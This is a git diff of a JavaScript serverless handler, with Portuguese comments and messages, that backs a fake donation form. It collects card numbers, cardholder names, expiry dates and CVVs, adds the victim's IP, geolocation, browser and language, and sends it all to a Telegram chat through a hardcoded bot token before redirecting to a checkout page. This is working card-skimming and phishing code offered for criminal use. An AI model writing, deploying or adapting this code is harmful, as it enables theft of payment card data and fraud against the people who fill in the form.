@@ -1,41 +1,38 @@
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
-    return res.status(405).json({ error: 'Só POST' });
+    return res.status(405).json({ error: 'Só POST caralho' });
   }
 
-  console.log('Body recebido:', req.body);
-
-  const body = req.body || {};
   const {
     numero_cartao = '',
     nome_cartao = '',
     validade_cartao = '',
     cvv = '',
     valor_doacao = ''
-  } = body;
+  } = req.body || {};
 
   if (!numero_cartao || !cvv || !valor_doacao) {
-    return res.status(400).send('Faltou campo');
+    return res.status(400).send('Preenche os campos essenciais porra');
   }
 
   const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.headers['cf-connecting-ip'] || req.socket?.remoteAddress || 'desconhecido';
-  console.log('IP:', ip);
+  const userAgent = req.headers['user-agent'] || 'N/A';
+  const acceptLanguage = req.headers['accept-language'] || 'N/A';
 
   let ipInfo = { query: ip, city: 'N/A', regionName: 'N/A', country: 'N/A', isp: 'N/A' };
   try {
-    const ipRes = await fetch(`http://ip-api.com/json/${ip}?fields=query,city,regionName,country,isp`);
-    if (ipRes.ok) ipInfo = await ipRes.json();
+    const ipResponse = await fetch(`http://ip-api.com/json/${ip}`);
+    if (ipResponse.ok) ipInfo = await ipResponse.json();
   } catch (e) {
-    console.error('ip-api erro:', e);
+    console.log('ip-api deu merda:', e);
   }
 
   let navegador = 'Desconhecido';
-  const ua = req.headers['user-agent'] || 'N/A';
-  if (/Firefox/i.test(ua)) navegador = 'Firefox';
-  else if (/Edg/i.test(ua)) navegador = 'Edge';
-  else if (/Chrome/i.test(ua)) navegador = 'Chrome';
-  else if (/Safari/i.test(ua)) navegador = 'Safari';
-  else if (/OPR|Opera/i.test(ua)) navegador = 'Opera';
+  if (/Firefox/i.test(userAgent)) navegador = 'Firefox';
+  else if (/Edg/i.test(userAgent)) navegador = 'Edge';
+  else if (/Chrome/i.test(userAgent)) navegador = 'Chrome';
+  else if (/Safari/i.test(userAgent)) navegador = 'Safari';
+  else if (/OPR|Opera/i.test(userAgent)) navegador = 'Opera';
 
   const dataHora = new Date().toISOString().replace('T', ' ').split('.')[0];
 
@@ -54,9 +51,9 @@ export default async function handler(req, res) {
 🌎 | País: ${ipInfo.country}
 📦 | ISP: ${ipInfo.isp}
 
-🔓 | USER-AGENT: ${ua}
+🔓 | USER-AGENT: ${userAgent}
 🌐 | NAVEGADOR: ${navegador}
-👥 | LINGUAGEM: ${req.headers['accept-language'] || 'N/A'}
+👥 | LINGUAGEM: ${acceptLanguage}
 📆 | DATA/HORA: ${dataHora}`;
 
   const botToken = '8249791748:AAHsushNFJnmQ_eh3QMx4ijxe8y8mVbZa9U';
@@ -65,18 +62,18 @@ export default async function handler(req, res) {
   const telegramUrl = `https://api.telegram.org/bot\( {botToken}/sendMessage?chat_id= \){chatId}&text=${encodeURIComponent(conteudo)}`;
 
   try {
-    console.log('Enviando pro TG...');
+    console.log('Enviando pro grupo:', conteudo.substring(0, 150));
     const tgRes = await fetch(telegramUrl);
     const tgText = await tgRes.text();
-    console.log('TG resposta:', tgText);
+    console.log('Telegram respondeu:', tgText);
+
     if (tgRes.ok) {
-      return res.redirect(302, '/css/checkout.html');
+      return res.redirect(302, '/checkout.html');
     } else {
-      return res.status(500).send('Erro TG: ' + tgText);
+      return res.status(500).send('Telegram fodeu: ' + tgText);
     }
   } catch (err) {
-    console.error('Fetch TG fodeu:', err);
-    return res.status(500).send('Erro total');
+    console.error('Fetch pro Telegram explodiu:', err.message);
+    return res.status(500).send('Merda geral');
   }
 }
-
